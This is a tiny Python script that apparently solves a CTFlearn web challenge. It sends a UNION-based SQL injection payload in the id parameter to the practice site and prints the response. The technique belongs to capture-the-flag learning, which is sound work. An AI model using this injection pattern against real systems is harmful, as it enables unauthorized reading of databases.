import requests

url = 'http://web.ctflearn.com/web8/'
id = "1 UNION SELECT f0und_m3,2,3,4 FROM w0w_y0u_f0und_m3"
r = requests.post(url + '/?id=' + id)

print (r.text)
